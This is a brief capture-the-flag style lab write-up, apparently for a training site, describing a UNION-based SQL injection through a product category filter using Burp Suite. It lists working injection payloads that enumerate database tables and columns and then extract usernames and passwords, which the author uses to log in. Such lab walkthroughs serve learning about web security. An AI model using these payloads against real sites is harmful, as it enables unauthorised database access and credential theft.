Retriving the username and password:
    -We use burip suite for this challenge
    -We use UNION attack vulnerability in the product category filter to combine the result
    -'+UNION+SELECT+'abc','def'-- For columns
    -'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- for the table name 
    -'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_Idyts'-- for the column which has username and password
    -'+UNION+SELECT+username_jducos,+password_ozunmx+FROM+users_Idyts-- for the password and username 
    -By usinng the password retrived from the above qrey we looged into the website